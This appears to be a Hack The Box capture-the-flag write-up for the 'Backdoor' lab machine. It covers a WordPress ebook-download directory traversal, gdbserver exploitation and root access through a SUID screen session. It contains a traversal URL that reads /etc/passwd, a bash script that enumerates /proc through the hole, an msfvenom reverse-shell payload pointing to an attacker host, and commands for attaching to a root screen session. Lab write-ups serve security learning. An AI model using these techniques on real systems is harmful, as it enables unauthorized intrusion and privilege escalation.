---
title: "Backdoor Hackthebox writeup"
author: "0xMesbaha"
cover: "/media/Backdoor/20220423032647.png"
tags: ["Hackthebox", "wordpress" ,"Waste", "directory Traversal","gdb server","screen"]
date: 2022-04-23T00:51:12+02:00
draft: false
---

In this easy Linux box we are facing a wordpress plugin vulnerable to directory traversal letting us reading some files on the system , brute forcing the /proc/[pid] found a vulnerable gdb server running , exploiting it will gain low privilege shell , then abusing the screen binary to get the root access.
<!--more-->

# Scanning
starting with a basic scanning :

```bash
nmap -A -T5 10.10.11.125

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

then checking the full port scan :

```bash
nmap -p- 10.10.11.125

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
```

# Enumeration
- so let's start with the port 80 , it is a simple web application

![error](/media/Backdoor/20220423062021.png)

- no parameters or any user interaction in the main pages.
- checking the source code we can see the ``backdoor.htb`` which we can add to the ``/etc/hosts`` and fuzzing Vhosts, But no results

![error](/media/Backdoor/20220423062216.png)

- directory Busting with ``dirsearch`` default wordlist

```bash
dirsearch -u http://10.10.11.125/ -x 403,404

[00:18:04] 200 -   19KB - /license.txt
[00:18:09] 200 -    7KB - /readme.html
[00:18:13] 301 -  315B  - /wp-admin  ->  http://10.10.11.125/wp-admin/
[00:18:13] 500 -    3KB - /wp-admin/setup-config.php
[00:18:13] 400 -    1B  - /wp-admin/admin-ajax.php
[00:18:13] 200 -    0B  - /wp-config.php
[00:18:13] 200 -    0B  - /wp-content/
[00:18:14] 500 -    0B  - /wp-content/plugins/hello.php
[00:18:14] 200 -  776B  - /wp-content/upgrade/
[00:18:14] 200 -    1KB - /wp-content/uploads/
[00:18:14] 301 -  318B  - /wp-includes  ->  http://10.10.11.125/wp-includes/
[00:18:14] 200 -    0B  - /wp-includes/rss-functions.php
[00:18:14] 200 -    0B  - /wp-cron.php
[00:18:14] 200 -    6KB - /wp-login.php
```

- i should have noticed it from wappalayzer , however the Directory Busting reveals wordpress is running
- we can start enumerating possible users with **wpscan** or start fuzzing username and password but i spent alot of time at this rabbit hole with no lead.
- we can check the plugins from ``/wp-content/plugins`` path , we can know that from [this](https://github.com/WordPress/WordPress/tree/master/) repository showing the default structure of a wordpress web application.

![error](/media/Backdoor/20220423063249.png)

- searching for it :

![error](/media/Backdoor/20220423063357.png)

- first result seems promising let's view it :
```bash
searchsploit -x 39575.txt
```

![error](/media/Backdoor/20220423063508.png)

- trying the POC we have :

![error](/media/Backdoor/20220423063751.png)

- downloading the file , we can read it confirming the exploit is working

![error](/media/Backdoor/20220423063824.png)

using :

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../etc/passwd
```

![error](/media/Backdoor/20220423063953.png)

- we know their is a user **user** , now we can try reading other sensitive files on the system
- check [this](https://zsahi.wordpress.com/2018/09/10/file-inclusion/) blog , talking about some interesting files to check whenever you have Directory Traversal / LFI
- Trying a lot of them until ``## Proc File System`` , we can query processes
- remember the WASTE port we found in the full port scan, which we do not know the service running on it
- we can brute-force the Processes running on the system until we know what is the service running at this port
- using bash :

```bash
#!/bin/bash

i=2
while  [ 1 ]
do
curl  "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/$i/cmdline"  2>/dev/null  > response.txt
((i++))
tmp=$(cat response.txt 2>/dev/null)
if [[ $tmp  == *"1337"* ]]
then
echo  "Process ID $i is the one."
break
fi
echo   "Process ID $i failed."
done
```

![error](/media/Backdoor/20220423071608.png)

```bash
 ~/CTFs/HTB/Backdoor$ cat response2.txt          
/proc/814/cmdline/proc/814/cmdline/proc/814/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>%
```

- and we know now **gdb server** is running on that port , searching for exploits found [this](https://www.exploit-db.com/exploits/50539) one
# Foothold

- trying the steps mentioned in the exploit :

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=4444 PrependFork=true -o rev.bin
```

![error](/media/Backdoor/20220423072122.png)

- and we got a shell as user **user**
# Privilege escalation
```bash
find / -perm -4000 2>/dev/null
```

![error](/media/Backdoor/20220423072343.png)

- screen binary with SUID doesn't have a clear path to gain root access, we can enumerate if the process is running with
```bash
ps -ef --forest
```

![error](/media/Backdoor/20220423072550.png)

- i have uploaded the [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64) to understand the process more

![error](/media/Backdoor/20220423072808.png)
![error](/media/Backdoor/20220423073116.png)

- reading about abusing other user's screen session [here](https://possiblelossofprecision.net/?p=1993)
![error](/media/Backdoor/20220423073257.png)
- so we can attach to this root screen with :

```bash
# screen -x [user]/screen
screen -x root/root
```

![error](/media/Backdoor/20220423073352.png)

### [BONUS] After root


running ``crontab -e`` to see how things were configured to work :

![error](/media/Backdoor/20220423073455.png)

- we can see the gdb server and the Screen binary cron jobs
